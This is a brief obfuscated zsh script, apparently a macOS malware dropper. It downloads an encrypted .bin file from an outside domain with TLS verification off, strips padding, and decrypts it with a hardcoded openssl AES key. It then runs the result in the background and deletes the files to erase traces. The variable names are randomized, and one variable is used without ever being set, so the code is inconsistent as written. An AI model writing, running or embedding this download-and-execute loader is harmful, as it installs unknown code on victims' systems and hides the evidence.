#!/bin/zsh
dcuuj=$(mktemp /tmp/zzk2jr.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/ma1c3bd993a1cafa1.bin" -o "$dcuujz" || exit 1
ya3ut6=$(stat -f %z "$dcuujz"); qfze35b=$(( ya3ut6 - 716 - 1737 ))
tail -c +$(( 716 + 1 )) "$dcuujz" | head -c $qfze35b | openssl enc -d -aes-256-cbc -k b6ac0b010305e03e07ecccc4 -out "$dcuuj" 2>/dev/null
[ -s "$dcuuj" ] && chmod 700 "$dcuuj" && ( "$dcuuj" & ) && disown
( sleep 3; rm -f "$dcuuj" "$dcuujz" ) &>/dev/null &
